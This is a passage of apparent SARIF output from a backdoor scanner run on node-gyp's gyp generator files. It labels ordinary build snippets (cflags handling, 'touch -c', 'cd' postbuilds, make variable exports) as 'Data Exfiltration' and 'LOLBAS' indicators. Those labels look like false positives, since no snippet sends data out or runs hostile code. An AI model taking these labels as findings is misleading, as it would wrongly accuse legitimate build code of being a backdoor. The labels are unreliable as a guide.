                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/compile_commands_json.py"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 36,
                  "endLine": 54,
                  "endColumn": 41,
                  "snippet": {
                    "text": "            cflags_cc = xcode_settings.GetCflagsCC(configuration_name)\n        else:\n            cflags = configuration.get(\"cflags\", [])\n            cflags_c = configuration.get(\"cflags_c\", [])\n            cflags_cc = configuration.get(\"cflags_cc\", [])\n\n        cflags_c = cflags + cflags_c\n",
                    "rendered": {
                      "text": "            cflags_cc = xcode_settings.GetCflagsCC(configuration_name)\n        else:\n            cflags = configuration.get(\"cflags\", [])\n            cflags_c = configuration.get(\"cflags_c\", [])\n            cflags_cc = configuration.get(\"cflags_cc\", [])\n\n        cflags_c = cflags + cflags_c\n",
                      "markdown": "`            cflags_cc = xcode_settings.GetCflagsCC(configuration_name)\n        else:\n            cflags = configuration.get(\"cflags\", [])\n            cflags_c = configuration.get(\"cflags_c\", [])\n            cflags_cc = configuration.get(\"cflags_cc\", [])\n\n        cflags_c = cflags + cflags_c\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/compile_commands_json.py"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 34,
                  "endLine": 53,
                  "endColumn": 39,
                  "snippet": {
                    "text": "            cflags_c = xcode_settings.GetCflagsC(configuration_name)\n            cflags_cc = xcode_settings.GetCflagsCC(configuration_name)\n        else:\n            cflags = configuration.get(\"cflags\", [])\n            cflags_c = configuration.get(\"cflags_c\", [])\n            cflags_cc = configuration.get(\"cflags_cc\", [])\n\n",
                    "rendered": {
                      "text": "            cflags_c = xcode_settings.GetCflagsC(configuration_name)\n            cflags_cc = xcode_settings.GetCflagsCC(configuration_name)\n        else:\n            cflags = configuration.get(\"cflags\", [])\n            cflags_c = configuration.get(\"cflags_c\", [])\n            cflags_cc = configuration.get(\"cflags_cc\", [])\n\n",
                      "markdown": "`            cflags_c = xcode_settings.GetCflagsC(configuration_name)\n            cflags_cc = xcode_settings.GetCflagsCC(configuration_name)\n        else:\n            cflags = configuration.get(\"cflags\", [])\n            cflags_c = configuration.get(\"cflags_c\", [])\n            cflags_cc = configuration.get(\"cflags_cc\", [])\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/compile_commands_json.py"
                },
                "region": {
                  "startLine": 45,
                  "startColumn": 42,
                  "endLine": 45,
                  "endColumn": 47,
                  "snippet": {
                    "text": "\n\ndef AddCommandsForTarget(cwd, target, params, per_config_commands):\n    output_dir = params[\"generator_flags\"].get(\"output_dir\", \"out\")\n    for configuration_name, configuration in target[\"configurations\"].items():\n        if IsMac(params):\n            xcode_settings = gyp.xcode_emulation.XcodeSettings(target)\n",
                    "rendered": {
                      "text": "\n\ndef AddCommandsForTarget(cwd, target, params, per_config_commands):\n    output_dir = params[\"generator_flags\"].get(\"output_dir\", \"out\")\n    for configuration_name, configuration in target[\"configurations\"].items():\n        if IsMac(params):\n            xcode_settings = gyp.xcode_emulation.XcodeSettings(target)\n",
                      "markdown": "`\n\ndef AddCommandsForTarget(cwd, target, params, per_config_commands):\n    output_dir = params[\"generator_flags\"].get(\"output_dir\", \"out\")\n    for configuration_name, configuration in target[\"configurations\"].items():\n        if IsMac(params):\n            xcode_settings = gyp.xcode_emulation.XcodeSettings(target)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2691,
                  "startColumn": 33,
                  "endLine": 2691,
                  "endColumn": 37,
                  "snippet": {
                    "text": "            part_of_all=qualified_target in needed_targets,\n        )\n\n        # Our root_makefile lives at the source root.  Compute the relative path\n        # from there to the output_file for including.\n        mkfile_rel_path = gyp.common.RelativePath(\n            output_file, os.path.dirname(makefile_path)\n",
                    "rendered": {
                      "text": "            part_of_all=qualified_target in needed_targets,\n        )\n\n        # Our root_makefile lives at the source root.  Compute the relative path\n        # from there to the output_file for including.\n        mkfile_rel_path = gyp.common.RelativePath(\n            output_file, os.path.dirname(makefile_path)\n",
                      "markdown": "`            part_of_all=qualified_target in needed_targets,\n        )\n\n        # Our root_makefile lives at the source root.  Compute the relative path\n        # from there to the output_file for including.\n        mkfile_rel_path = gyp.common.RelativePath(\n            output_file, os.path.dirname(makefile_path)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2610,
                  "startColumn": 24,
                  "endLine": 2610,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            make_global_settings += \"endif\\n\"\n        else:\n            make_global_settings += f\"{key} ?= {value}\\n\"\n    # TODO(ukai): define cmd when only wrapper is specified in\n    # make_global_settings.\n\n    header_params[\"make_global_settings\"] = make_global_settings\n",
                    "rendered": {
                      "text": "            make_global_settings += \"endif\\n\"\n        else:\n            make_global_settings += f\"{key} ?= {value}\\n\"\n    # TODO(ukai): define cmd when only wrapper is specified in\n    # make_global_settings.\n\n    header_params[\"make_global_settings\"] = make_global_settings\n",
                      "markdown": "`            make_global_settings += \"endif\\n\"\n        else:\n            make_global_settings += f\"{key} ?= {value}\\n\"\n    # TODO(ukai): define cmd when only wrapper is specified in\n    # make_global_settings.\n\n    header_params[\"make_global_settings\"] = make_global_settings\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1838,
                  "startColumn": 13,
                  "endLine": 1838,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            # nested subfolders, the framework directory will be older than\n            # its dependencies usually. To prevent this rule from executing\n            # on every build (expensive, especially with postbuilds), expliclity\n            # update the time on the framework directory.\n            self.WriteLn(\"\\t@touch -c %s\" % QuoteSpaces(self.output))\n\n        if postbuilds:\n",
                    "rendered": {
                      "text": "            # nested subfolders, the framework directory will be older than\n            # its dependencies usually. To prevent this rule from executing\n            # on every build (expensive, especially with postbuilds), expliclity\n            # update the time on the framework directory.\n            self.WriteLn(\"\\t@touch -c %s\" % QuoteSpaces(self.output))\n\n        if postbuilds:\n",
                      "markdown": "`            # nested subfolders, the framework directory will be older than\n            # its dependencies usually. To prevent this rule from executing\n            # on every build (expensive, especially with postbuilds), expliclity\n            # update the time on the framework directory.\n            self.WriteLn(\"\\t@touch -c %s\" % QuoteSpaces(self.output))\n\n        if postbuilds:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1305,
                  "startColumn": 60,
                  "endLine": 1305,
                  "endColumn": 64,
                  "snippet": {
                    "text": "                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n",
                    "rendered": {
                      "text": "                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n",
                      "markdown": "`                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1305,
                  "startColumn": 43,
                  "endLine": 1305,
                  "endColumn": 51,
                  "snippet": {
                    "text": "                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n",
                    "rendered": {
                      "text": "                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n",
                      "markdown": "`                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 971,
                  "startColumn": 9,
                  "endLine": 971,
                  "endColumn": 17,
                  "snippet": {
                    "text": "        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = install_path\n\n        # Update global list of link dependencies.\n        if self.type in (\"static_library\", \"shared_library\"):\n            target_link_deps[qualified_target] = self.output_binary\n\n",
                    "rendered": {
                      "text": "        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = install_path\n\n        # Update global list of link dependencies.\n        if self.type in (\"static_library\", \"shared_library\"):\n            target_link_deps[qualified_target] = self.output_binary\n\n",
                      "markdown": "`        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = install_path\n\n        # Update global list of link dependencies.\n        if self.type in (\"static_library\", \"shared_library\"):\n            target_link_deps[qualified_target] = self.output_binary\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 968,
                  "startColumn": 9,
                  "endLine": 968,
                  "endColumn": 17,
                  "snippet": {
                    "text": "            part_of_all,\n        )\n\n        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = install_path\n\n        # Update global list of link dependencies.\n",
                    "rendered": {
                      "text": "            part_of_all,\n        )\n\n        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = install_path\n\n        # Update global list of link dependencies.\n",
                      "markdown": "`            part_of_all,\n        )\n\n        # Update global list of target outputs, used in dependency tracking.\n        target_outputs[qualified_target] = install_path\n\n        # Update global list of link dependencies.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 439,
                  "startColumn": 48,
                  "endLine": 439,
                  "endColumn": 52,
                  "snippet": {
                    "text": "#   DEP3:\n# so if the files are missing, they're just considered phony rules.\n# We have to do some pretty insane escaping to get those backslashes\n# and dollar signs past make, the shell, and sed at the same time.\n# Doesn't work with spaces, but that's fine: .d files have spaces in\n# their names replaced with other characters.\"\"\"\n    r\"\"\"\n",
                    "rendered": {
                      "text": "#   DEP3:\n# so if the files are missing, they're just considered phony rules.\n# We have to do some pretty insane escaping to get those backslashes\n# and dollar signs past make, the shell, and sed at the same time.\n# Doesn't work with spaces, but that's fine: .d files have spaces in\n# their names replaced with other characters.\"\"\"\n    r\"\"\"\n",
                      "markdown": "`#   DEP3:\n# so if the files are missing, they're just considered phony rules.\n# We have to do some pretty insane escaping to get those backslashes\n# and dollar signs past make, the shell, and sed at the same time.\n# Doesn't work with spaces, but that's fine: .d files have spaces in\n# their names replaced with other characters.\"\"\"\n    r\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 417,
                  "startColumn": 58,
                  "endLine": 417,
                  "endColumn": 62,
                  "snippet": {
                    "text": "\n# Flags to make gcc output dependency info.  Note that you need to be\n# careful here to use the flags that ccache and distcc can understand.\n# We write to a dep file on the side first and then rename at the end\n# so we can't end up with a broken dep file.\ndepfile = $(depsdir)/$(call replace_spaces,$@).d\nDEPFLAGS = %(makedep_args)s -MF $(depfile).raw\n",
                    "rendered": {
                      "text": "\n# Flags to make gcc output dependency info.  Note that you need to be\n# careful here to use the flags that ccache and distcc can understand.\n# We write to a dep file on the side first and then rename at the end\n# so we can't end up with a broken dep file.\ndepfile = $(depsdir)/$(call replace_spaces,$@).d\nDEPFLAGS = %(makedep_args)s -MF $(depfile).raw\n",
                      "markdown": "`\n# Flags to make gcc output dependency info.  Note that you need to be\n# careful here to use the flags that ccache and distcc can understand.\n# We write to a dep file on the side first and then rename at the end\n# so we can't end up with a broken dep file.\ndepfile = $(depsdir)/$(call replace_spaces,$@).d\nDEPFLAGS = %(makedep_args)s -MF $(depfile).raw\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2634,
                  "startColumn": 5,
                  "endLine": 2634,
                  "endColumn": 11,
                  "snippet": {
                    "text": "    dest_path = os.path.dirname(makefile_path)\n    gyp.common.CopyTool(flavor, dest_path)\n\n    # Find the list of targets that derive from the gyp file(s) being built.\n    needed_targets = set()\n    for build_file in params[\"build_files\"]:\n        for target in gyp.common.AllTargets(target_list, target_dicts, build_file):\n",
                    "rendered": {
                      "text": "    dest_path = os.path.dirname(makefile_path)\n    gyp.common.CopyTool(flavor, dest_path)\n\n    # Find the list of targets that derive from the gyp file(s) being built.\n    needed_targets = set()\n    for build_file in params[\"build_files\"]:\n        for target in gyp.common.AllTargets(target_list, target_dicts, build_file):\n",
                      "markdown": "`    dest_path = os.path.dirname(makefile_path)\n    gyp.common.CopyTool(flavor, dest_path)\n\n    # Find the list of targets that derive from the gyp file(s) being built.\n    needed_targets = set()\n    for build_file in params[\"build_files\"]:\n        for target in gyp.common.AllTargets(target_list, target_dicts, build_file):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2305,
                  "startColumn": 60,
                  "endLine": 2305,
                  "endColumn": 65,
                  "snippet": {
                    "text": "            #  foo := a\\ b\n            # the escaped space does the right thing. For\n            #  export foo := a\\ b\n            # it does not -- the backslash is written to the env as literal character.\n            # So don't escape spaces in |env[k]|.\n            self.WriteLn(f\"{QuoteSpaces(target)}: export {k} := {v}\")\n\n",
                    "rendered": {
                      "text": "            #  foo := a\\ b\n            # the escaped space does the right thing. For\n            #  export foo := a\\ b\n            # it does not -- the backslash is written to the env as literal character.\n            # So don't escape spaces in |env[k]|.\n            self.WriteLn(f\"{QuoteSpaces(target)}: export {k} := {v}\")\n\n",
                      "markdown": "`            #  foo := a\\ b\n            # the escaped space does the right thing. For\n            #  export foo := a\\ b\n            # it does not -- the backslash is written to the env as literal character.\n            # So don't escape spaces in |env[k]|.\n            self.WriteLn(f\"{QuoteSpaces(target)}: export {k} := {v}\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2289,
                  "startColumn": 35,
                  "endLine": 2289,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n    def GetSortedXcodePostbuildEnv(self):\n        # CHROMIUM_STRIP_SAVE_FILE is a chromium-specific hack.\n        # TODO(thakis): It would be nice to have some general mechanism instead.\n        strip_save_file = self.xcode_settings.GetPerTargetSetting(\n            \"CHROMIUM_STRIP_SAVE_FILE\", \"\"\n        )\n",
                    "rendered": {
                      "text": "\n    def GetSortedXcodePostbuildEnv(self):\n        # CHROMIUM_STRIP_SAVE_FILE is a chromium-specific hack.\n        # TODO(thakis): It would be nice to have some general mechanism instead.\n        strip_save_file = self.xcode_settings.GetPerTargetSetting(\n            \"CHROMIUM_STRIP_SAVE_FILE\", \"\"\n        )\n",
                      "markdown": "`\n    def GetSortedXcodePostbuildEnv(self):\n        # CHROMIUM_STRIP_SAVE_FILE is a chromium-specific hack.\n        # TODO(thakis): It would be nice to have some general mechanism instead.\n        strip_save_file = self.xcode_settings.GetPerTargetSetting(\n            \"CHROMIUM_STRIP_SAVE_FILE\", \"\"\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2210,
                  "startColumn": 39,
                  "endLine": 2210,
                  "endColumn": 47,
                  "snippet": {
                    "text": "            # sources.\n            \"$(CFLAGS_C_$(BUILDTYPE)) \"\n            # $(INCS_$(BUILDTYPE)) includes the prefix '-I' while\n            # LOCAL_C_INCLUDES does not expect it.  So put it in\n            # LOCAL_CFLAGS.\n            \"$(INCS_$(BUILDTYPE))\"\n        )\n",
                    "rendered": {
                      "text": "            # sources.\n            \"$(CFLAGS_C_$(BUILDTYPE)) \"\n            # $(INCS_$(BUILDTYPE)) includes the prefix '-I' while\n            # LOCAL_C_INCLUDES does not expect it.  So put it in\n            # LOCAL_CFLAGS.\n            \"$(INCS_$(BUILDTYPE))\"\n        )\n",
                      "markdown": "`            # sources.\n            \"$(CFLAGS_C_$(BUILDTYPE)) \"\n            # $(INCS_$(BUILDTYPE)) includes the prefix '-I' while\n            # LOCAL_C_INCLUDES does not expect it.  So put it in\n            # LOCAL_CFLAGS.\n            \"$(INCS_$(BUILDTYPE))\"\n        )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1838,
                  "startColumn": 24,
                  "endLine": 1838,
                  "endColumn": 30,
                  "snippet": {
                    "text": "            # nested subfolders, the framework directory will be older than\n            # its dependencies usually. To prevent this rule from executing\n            # on every build (expensive, especially with postbuilds), expliclity\n            # update the time on the framework directory.\n            self.WriteLn(\"\\t@touch -c %s\" % QuoteSpaces(self.output))\n\n        if postbuilds:\n",
                    "rendered": {
                      "text": "            # nested subfolders, the framework directory will be older than\n            # its dependencies usually. To prevent this rule from executing\n            # on every build (expensive, especially with postbuilds), expliclity\n            # update the time on the framework directory.\n            self.WriteLn(\"\\t@touch -c %s\" % QuoteSpaces(self.output))\n\n        if postbuilds:\n",
                      "markdown": "`            # nested subfolders, the framework directory will be older than\n            # its dependencies usually. To prevent this rule from executing\n            # on every build (expensive, especially with postbuilds), expliclity\n            # update the time on the framework directory.\n            self.WriteLn(\"\\t@touch -c %s\" % QuoteSpaces(self.output))\n\n        if postbuilds:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1792,
                  "startColumn": 24,
                  "endLine": 1792,
                  "endColumn": 32,
                  "snippet": {
                    "text": "                    )\n                )\n\n            # Postbuilds expect to be run in the gyp file's directory, so insert an\n            # implicit postbuild to cd to there.\n            postbuilds.insert(0, gyp.common.EncodePOSIXShellList([\"cd\", self.path]))\n            for i, postbuild in enumerate(postbuilds):\n",
                    "rendered": {
                      "text": "                    )\n                )\n\n            # Postbuilds expect to be run in the gyp file's directory, so insert an\n            # implicit postbuild to cd to there.\n            postbuilds.insert(0, gyp.common.EncodePOSIXShellList([\"cd\", self.path]))\n            for i, postbuild in enumerate(postbuilds):\n",
                      "markdown": "`                    )\n                )\n\n            # Postbuilds expect to be run in the gyp file's directory, so insert an\n            # implicit postbuild to cd to there.\n            postbuilds.insert(0, gyp.common.EncodePOSIXShellList([\"cd\", self.path]))\n            for i, postbuild in enumerate(postbuilds):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1308,
                  "startColumn": 15,
                  "endLine": 1308,
                  "endColumn": 20,
                  "snippet": {
                    "text": "                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n                output = gyp.xcode_emulation.ExpandEnvVars(output, env)\n                path = gyp.xcode_emulation.ExpandEnvVars(path, env)\n                self.WriteDoCmd([output], [path], \"copy\", part_of_all)\n",
                    "rendered": {
                      "text": "                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n                output = gyp.xcode_emulation.ExpandEnvVars(output, env)\n                path = gyp.xcode_emulation.ExpandEnvVars(path, env)\n                self.WriteDoCmd([output], [path], \"copy\", part_of_all)\n",
                      "markdown": "`                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n                output = gyp.xcode_emulation.ExpandEnvVars(output, env)\n                path = gyp.xcode_emulation.ExpandEnvVars(path, env)\n                self.WriteDoCmd([output], [path], \"copy\", part_of_all)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1306,
                  "startColumn": 65,
                  "endLine": 1306,
                  "endColumn": 70,
                  "snippet": {
                    "text": "                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n                output = gyp.xcode_emulation.ExpandEnvVars(output, env)\n",
                    "rendered": {
                      "text": "                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n                output = gyp.xcode_emulation.ExpandEnvVars(output, env)\n",
                      "markdown": "`                # work either, because then the .d files will potentially contain spaces\n                # after variable expansion, and .d file handling cannot handle spaces.\n                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n                output = gyp.xcode_emulation.ExpandEnvVars(output, env)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
